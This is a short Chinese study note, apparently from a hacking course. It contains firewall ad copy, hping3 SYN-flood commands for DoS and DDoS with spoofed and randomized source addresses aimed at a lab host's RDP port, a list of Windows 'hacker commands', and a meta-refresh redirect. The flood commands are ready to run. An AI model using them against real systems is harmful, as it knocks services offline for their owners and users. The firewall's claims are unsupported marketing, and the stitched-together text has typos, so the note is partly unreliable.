asp



```

冰盾防火墙防范DoS攻击

http://www.bingdun.com/
●冰盾防火墙技术来自IT技术世界一流的美国硅谷，由华人
留学生于2003年设计开发，采用国际领先的生物基因鉴
别技术智能识别各种DDoS攻击和黑客入侵行为
●在抗DDoS攻击方面，工作于1000M网卡冰盾约可抵御
160多万个SYN攻击包
在防黑客入侵方面，冰盾可智能识别Port扫描、Unicode
恶意编码、SQL注入攻击、Trojan木马上传、Exploit 漏
洞利用等2000多种黑客入侵行为并自动阻止

```





```
DOS :  hping3 -i u10 -a 2.2.2.2 -p 3389 -S 192.168.0.129
DDOS:  hping3 -i u10 -p 3389 -S --rand-source 192.168.0.129

常用的有洪水方式攻击: SYN FLOOD
				  PING FLOOD

2,DoS攻击实验:一台KALI ;一台2003--互通
hping3 -i 指定攻击时间间隔
	1S=1000m毫秒
	1m=1000u微妙
	-a  指定伪造源地址
	-p 指定端口
	-S 使用SYN标记
	--rand-source 随机源地址
	
DDoS 分布式拒绝服务攻击

黑客常用的DOS命令
netstat -a查看开启了哪些端口,常用netstat -an
netstat -n查看端的网络连接情况，常用netstat -an
netstat -V查看正在进行的工作
at id号 --开启已注册的某个计划任务
at /delete --停止所有计划任务，用参数/yes则不需要确认就直接停止
at id号 /delete  --停止某个已注册的计划任务
at  --查看所有的计划任务
attrib  --文件名(目录名)查看某文件(目录)的属性
atrib 文件名 -A -R -S -H 或 +A +R +S +H  --去掉(添加)某文件的存档，只读，系统,隐藏属性;用+
则是添加为某属性

```



```
<meta http-equiv="refresh" content="5;url=http://www.cracer.com" />
```

